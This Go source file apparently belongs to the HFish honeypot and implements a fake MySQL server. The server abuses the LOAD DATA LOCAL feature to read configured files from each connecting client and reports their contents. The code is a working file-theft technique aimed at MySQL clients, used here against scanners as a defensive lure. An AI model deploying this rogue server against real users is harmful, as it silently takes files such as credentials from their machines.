package mysql

import (
	"bytes"
	"encoding/binary"
	"net"
	"syscall"
	"strings"
	"HFish/error"
	"HFish/core/report"
	"HFish/utils/try"
	"HFish/utils/log"
	"HFish/utils/is"
	"HFish/core/rpc/client"
	"strconv"
	"HFish/core/pool"
	"time"
)

//读取文件时每次读取的字节数
const bufLength = 1024

//服务器第一个数据包的数据，可以根据格式自定义，这里要注意SSL字段要置0
var GreetingData = []byte{
	0x4a, 0x00, 0x00, 0x00, 0x0a, 0x35, 0x2e, 0x35, 0x2e, 0x35, 0x33,
	0x00, 0x01, 0x00, 0x00, 0x00, 0x75, 0x51, 0x73, 0x6f, 0x54, 0x36,
	0x50, 0x70, 0x00, 0xff, 0xf7, 0x21, 0x02, 0x00, 0x0f, 0x80, 0x15,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64,
	0x26, 0x2b, 0x47, 0x62, 0x39, 0x35, 0x3c, 0x6c, 0x30, 0x45, 0x4a,
	0x00, 0x6d, 0x79, 0x73, 0x71, 0x6c, 0x5f, 0x6e, 0x61, 0x74, 0x69,
	0x76, 0x65, 0x5f, 0x70, 0x61, 0x73, 0x73, 0x77, 0x6f, 0x72, 0x64,
	0x00,
}

//服务器第二个数据包认证成功的OK响应
var OkData = []byte{0x07, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00}

//保存要读取的文件列表
var fileNames []string

//记录每个客户端连接的次数
var recordClient = make(map[string]int)

func Start(addr string, files string) {
	// 启动 Mysql 服务端
	serverAddr, _ := net.ResolveTCPAddr("tcp", addr)
	listener, _ := net.ListenTCP("tcp", serverAddr)

	// 读取文件列表
	fileNames = strings.Split(files, ",")

	wg, poolX := pool.New(10)
	defer poolX.Release()

	for {
		wg.Add(1)
		poolX.Submit(func() {
			time.Sleep(time.Second * 2)

			conn, err := listener.Accept()

			if err != nil {
				log.Pr("Mysql", "127.0.0.1", "Mysql 连接失败", err)
			}

			arr := strings.Split(conn.RemoteAddr().String(), ":")

			ip := arr[0]

			//这里记录每个客户端连接的次数，实现获取多个文件
			_, ok := recordClient[ip]
			if ok {
				if recordClient[ip] < len(fileNames)-1 {
					recordClient[ip] += 1
				}
			} else {
				recordClient[ip] = 0
			}

			go connectionClientHandler(conn)

			wg.Done()
		})
	}
}

func connectionClientHandler(conn net.Conn) {
	defer conn.Close()
	connFrom := conn.RemoteAddr().String()

	arr := strings.Split(connFrom, ":")

	// 判断是否为 RPC 客户端
	var id string

	if is.Rpc() {
		id = client.ReportResult("MYSQL", "", arr[0], connFrom+" 已经连接", "0")
	} else {
		id = strconv.FormatInt(report.ReportMysql(arr[0], "本机", connFrom+" 已经连接"), 10)
	}

	log.Pr("Mysql", arr[0], "已经连接")

	try.Try(func() {
		var ibuf = make([]byte, bufLength)

		//第一个包
		_, err := conn.Write(GreetingData)
		error.Check(err, "")

		//第二个包
		_, err = conn.Read(ibuf[0: bufLength-1])

		//判断是否有Can Use LOAD DATA LOCAL标志，如果有才支持读取文件
		if (uint8(ibuf[4]) & uint8(128)) == 0 {
			_ = conn.Close()
			return
		}
		//第三个包
		_, err = conn.Write(OkData)

		//第四个包
		_, err = conn.Read(ibuf[0: bufLength-1])

		//这里根据客户端连接的次数来选择读取文件列表里面的第几个文件
		ip, _, _ := net.SplitHostPort(conn.RemoteAddr().String())
		getFileData := []byte{byte(len(fileNames[recordClient[ip]]) + 1), 0x00, 0x00, 0x01, 0xfb}
		getFileData = append(getFileData, fileNames[recordClient[ip]]...)

		//第五个包
		_, err = conn.Write(getFileData)
		getRequestContent(conn, id)

	}).Catch(func() {
		log.Pr("Mysql", arr[0], "该客户端正在使用扫描器扫描")

		if is.Rpc() {
			go client.ReportResult("MYSQL", "", "", "&&该客户端正在使用扫描器扫描", id)
		} else {
			// 有扫描器扫描
			go report.ReportUpdateMysql(id, "&&该客户端正在使用扫描器扫描")
		}
	})
}

//获取客户端传来的文件数据
func getRequestContent(conn net.Conn, id string) {
	var content bytes.Buffer
	//先读取数据包长度，前面3字节
	lengthBuf := make([]byte, 3)
	_, err := conn.Read(lengthBuf)
	error.Check(err, "")

	totalDataLength := int(binary.LittleEndian.Uint32(append(lengthBuf, 0)))
	if totalDataLength == 0 {
		return
	}
	//然后丢掉1字节的序列号
	_, _ = conn.Read(make([]byte, 1))
	ibuf := make([]byte, bufLength)
	totalReadLength := 0
	//循环读取知道读取的长度达到包长度
	for {
		length, err := conn.Read(ibuf)
		switch err {
		case nil:
			//如果本次读取的内容长度+之前读取的内容长度大于文件内容总长度，则本次读取的文件内容只能留下一部分
			if length+totalReadLength > totalDataLength {
				length = totalDataLength - totalReadLength
			}
			content.Write(ibuf[0:length])
			totalReadLength += length
			if totalReadLength == totalDataLength {
				//读取完成保存到本地文件
				getFileContent(content, id)
				//随便写点数据给客户端
				_, _ = conn.Write(OkData)
			}
		case syscall.EAGAIN: // try again
			continue
		default:
			arr := strings.Split(conn.RemoteAddr().String(), ":")
			log.Pr("Mysql", arr[0], "已经关闭连接")
			return
		}
	}
}

// 获取文件内容
func getFileContent(content bytes.Buffer, id string) {
	if is.Rpc() {
		go client.ReportResult("MYSQL", "", "", "&&"+content.String(), id)
	} else {
		go report.ReportUpdateMysql(id, "&&"+content.String())
	}
}
